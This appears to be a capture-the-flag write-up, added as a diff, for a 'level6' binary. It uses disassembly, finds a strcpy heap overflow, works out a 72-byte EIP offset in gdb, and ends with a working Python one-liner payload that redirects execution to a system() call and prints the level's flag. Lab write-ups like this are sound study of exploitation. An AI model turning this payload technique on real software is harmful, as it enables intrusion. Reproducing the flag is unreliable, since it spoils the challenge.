@@ -1,0 +1,54 @@
+> ./level6
+Segmentation fault (core dumped)
+
+> ./level6 test
+Nope
+
+# objdump -d level6, interresting part
+08048454 <n>:
+ 8048454:	55                   	push   %ebp
+ 8048455:	89 e5                	mov    %esp,%ebp
+ 8048457:	83 ec 18             	sub    $0x18,%esp
+ 804845a:	c7 04 24 b0 85 04 08 	movl   $0x80485b0,(%esp)
+ 8048461:	e8 0a ff ff ff       	call   8048370 <system@plt> # Where we want the exploit to take us
+ 8048466:	c9                   	leave
+ 8048467:	c3                   	ret
+
+08048468 <m>:
+ 8048468:	55                   	push   %ebp
+ 8048469:	89 e5                	mov    %esp,%ebp
+ 804846b:	83 ec 18             	sub    $0x18,%esp
+ 804846e:	c7 04 24 d1 85 04 08 	movl   $0x80485d1,(%esp) # x /s 0x80485d1 = Nope
+ 8048475:	e8 e6 fe ff ff       	call   8048360 <puts@plt>
+ 804847a:	c9                   	leave
+ 804847b:	c3                   	ret
+
+0804847c <main>:
+ 8048482:	83 ec 20             	sub    $0x20,%esp
+ 8048485:	c7 04 24 40 00 00 00 	movl   $0x40,(%esp)
+ 804848c:	e8 bf fe ff ff       	call   8048350 <malloc@plt> # Malloc
+ 8048491:	89 44 24 1c          	mov    %eax,0x1c(%esp)
+ 8048495:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
+ 804849c:	e8 af fe ff ff       	call   8048350 <malloc@plt> # Malloc
+
+ 80484c5:	e8 76 fe ff ff       	call   8048340 <strcpy@plt> # Vulnerable and addr 8048340 -> m function
+ 
+ # We need to heap overflow, so let's do like level2 to get the eip offset (https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) FLEMME DE METASPLOIT
+
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+0x41346341 in ?? ()
+(gdb) info register eip
+eip            0x41346341	0x41346341
+
+EIP Value: 0x41346341
+Offset: 72
+
+# Let's explooit
+
+> python -c 'print "a"*72 + "\x54\x84\x04\x08"' > /tmp/exploit
+> cat /tmp/exploit | ./level6 # Not working cause he need the string as an argument, BUT $() allow you to pass a cmd and will execute it SO
+
+> ./level6 $(python -c 'print "a"*72 + "\x54\x84\x04\x08"')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+# BRRRRRRRRRR
